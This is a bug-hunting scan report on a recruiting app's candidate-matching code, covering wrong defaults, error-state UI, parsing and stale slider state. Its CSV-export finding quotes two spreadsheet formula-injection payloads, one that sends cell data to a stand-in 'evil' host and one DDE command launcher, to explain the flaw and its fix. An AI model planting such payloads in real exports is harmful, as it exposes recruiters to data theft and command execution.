# Candidate Profile & Job Matching — bug-hunter + ui-perfectionist scan

> Context: Build a structured CandidateProfile from evidence and match one candidate against many jobs with deterministic scoring plus cached LLM reasoning. Covers Profile, Match, archetypes, and the candidate matrix.
> Files reviewed: 22 of 40
> Total: 5

## 1. `resolveCandidate` hard-defaults roleFamily to `software_engineering` (and seniority to `medior`), violating the new "never assume software" invariant

- **Severity**: High
- **Lens**: bug-hunter
- **Category**: silent-failure / edge-case
- **File**: `app/_lib/match-candidate.ts:41-58` (defaults); `app/_lib/role-families.ts:50-52` (violated invariant)
- **Scenario**: A recruiter picks a saved analysis in the Match tab (`source: "analysis"`) whose extracted `payload.candidate` has no `roleFamily` — common for a non-tech CV, a degraded extraction, or an analysis saved before the role-family taxonomy was widened. `resolveCandidate` fills `roleFamily: (c.roleFamily) ?? "software_engineering"` and `seniority: (c.currentSeniority) ?? "medior"`, then hands those to the Python matcher.
- **Root cause**: `role-families.ts` (newly added) establishes `DEFAULT_ROLE_FAMILY = "general_professional"` with the explicit comment "Never assume software," precisely so healthcare/trades/finance candidates aren't collapsed into software. But this core match-input path still hardcodes the old `software_engineering` fallback (and `ProfileForm.ts:99` carries the same stale assumption in a comment). The two conventions have drifted; the matching path uses the wrong one. The archetype fallback right beside it was already fixed to a fail-closed `"unknown"` (line 56) — roleFamily/seniority were left behind.
- **Impact**: Silently wrong scores. A nurse or electrician analyzed without a captured roleFamily is matched as a mid-level software engineer: role-family gates and salary/seniority KO floors fire on the wrong family, so the ranking and any downstream decision are miscategorized with no visible signal. This is exactly the class `role-families.ts` was introduced to prevent.
- **Fix sketch**: Import and use `DEFAULT_ROLE_FAMILY` here instead of the literal; make seniority an explicit `"unknown"` sentinel (as archetype already is) so the Python KO floor fails closed rather than assuming "medior". Grep the repo for `"software_engineering"` string defaults and route them all through `DEFAULT_ROLE_FAMILY` so this default lives in one place.

## 2. [STILL-OPEN] A failed re-rank replaces the entire on-screen ranking with one red line

- **Severity**: High
- **Lens**: ui-perfectionist
- **Category**: missing-ui-state / error-state
- **File**: `app/features/sub_match/MatchTab.tsx:188-209` (render gate), `:65-88` (runMatchFor)
- **Scenario**: A recruiter has a full ranked result on screen, opens WeightsPanel, drags a slider, clicks "Apply re-rank"; the `/api/match` POST fails (timeout / 500 / network blip).
- **Root cause**: `runMatchFor` deliberately does NOT clear `result` on a re-run (comment lines 69-72) so `<Results>`/WeightsPanel stay mounted — but the render gate is still ordered `error ? … : result ? <Results …> : …`. Because `error` is checked first, a transient re-weight failure with a perfectly good prior `result` still in state collapses the whole ranking, WeightsPanel and shortlist selections to a single red paragraph. This was reported in the 2026-06-20 scan (finding #1) and the gate order is unchanged.
- **Impact**: One failed re-rank throws away the entire ranking and all local selections; the component's own stated design goal (keep results mounted during a re-rank) is silently defeated by the gate order.
- **Fix sketch**: When `result` exists, render `<Results>` and surface `error` as a non-destructive inline banner inside/above it; only fall to the full-panel error branch when there is no prior `result`. Make the class impossible by passing `error` into `<Results>` rather than gating the whole panel on it.

## 3. AI profile-draft route uses raw `JSON.parse(stdout)` — a successful draft 500s on interpreter teardown noise

- **Severity**: Medium
- **Lens**: bug-hunter
- **Category**: silent-failure / edge-case
- **File**: `app/api/profile/draft/route.ts:39`
- **Scenario**: A recruiter pastes notes and runs AI draft. `profile_draft_cli` invokes the LLM, prints the result JSON line, then the interpreter emits async teardown chatter (`Event loop is closed`, a `ResourceWarning`) on stdout after it. `JSON.parse(stdout)` chokes on the trailing non-JSON and the route returns 500 — discarding a successful (and possibly paid) draft.
- **Root cause**: Every other CLI seam in this context deliberately uses `parsePythonJson` (which scans from the end for the first JSON object) for exactly this reason — see `app/api/profile/route.ts:68`, `app/api/match/route.ts:78`, `app/_lib/reasoning-run.ts:94`, each with a comment naming the asyncio-shutdown hazard. The draft route is the one seam that regressed to a bare parse, and it is on the LLM path most prone to teardown noise.
- **Impact**: Intermittent, hard-to-reproduce 500s on a working feature; the recruiter's notes and the LLM cost are lost with a generic "AI draft failed."
- **Fix sketch**: Replace `JSON.parse(stdout)` with `parsePythonJson<...>(stdout, stderr)`, matching the sibling routes. Add a lint/test that asserts no route under `app/api/**` calls `JSON.parse` directly on a Python `stdout`.

## 4. Match-ranking CSV export is vulnerable to spreadsheet formula injection via candidate-controlled fields

- **Severity**: Medium
- **Lens**: bug-hunter
- **Category**: validation-gap / security
- **File**: `app/features/sub_match/Results.tsx:114-129` (exportCsv), `app/_lib/export-utils.ts:10-16` (toCsv)
- **Scenario**: A candidate applies with a display name or a CV skill like `=HYPERLINK("http://evil/"&A1,"click")` (or `=cmd|'/c calc'!A1`). It rides through intake → `candidate.label` / `matchedSkills`. The recruiter clicks "Export CSV" and opens `matches-<candidate>.csv` in Excel/Sheets; the cell is evaluated as a formula.
- **Root cause**: `toCsv` correctly RFC-4180-quotes fields containing `",\r\n`, but does nothing about a leading `=`, `+`, `-`, `@`, or tab — the formula-trigger characters. The exported rows include attacker-influenced values (candidate label, matched/missing skills, company/title) with no neutralization.
- **Impact**: Data exfiltration or command execution in the recruiter's spreadsheet client from an untrusted applicant-supplied string — a classic CSV-injection path that hiring apps are a prime target for.
- **Fix sketch**: In `toCsv`'s `cell()`, prefix any value whose first char is one of `= + - @ \t \r` with a single quote (or wrap it), then quote as today. Centralizing it in `toCsv` fixes every export surface (matrix, reports, invites) at once.

## 5. WeightsPanel keeps stale slider values after an apply — sliders and results disagree, "Apply re-rank" stays falsely enabled

- **Severity**: Medium
- **Lens**: ui-perfectionist
- **Category**: state-corruption / interaction-correctness
- **File**: `app/features/sub_match/WeightsPanel.tsx:42-48,85-98` (no re-sync of `draft`); `app/features/sub_match/Results.tsx:188-197` (re-seeds `weights` from the normalized response)
- **Scenario**: With the panel open, a recruiter drags skills to 60% (career/personal unchanged) and clicks "Apply re-rank". The server renormalizes to sum-100 and the parent re-seeds `candidate.weights` from the response (e.g. 45/33/22). The panel stays open.
- **Root cause**: `draft` is seeded from `weights` only on mount and on the open-button click — there is no effect syncing `draft` when the `weights` prop changes after an apply. So the sliders and the `{n}%` labels keep showing the pre-normalization draft (60/x/y) while the ranking now reflects the normalized vector, and `dirty` (line 48) compares draft≠weights and stays true, leaving "Apply re-rank" enabled as if there were unsaved changes.
- **Impact**: The panel lies about the weights actually in effect and invites a pointless second re-rank; the numbers shown never match the ranking beneath them.
- **Fix sketch**: Add `useEffect(() => setDraft(weights), [weights])` (or key the panel on the applied vector) so the sliders re-anchor to what the server actually used after each apply; keep the open/close seed as the manual-reset path.
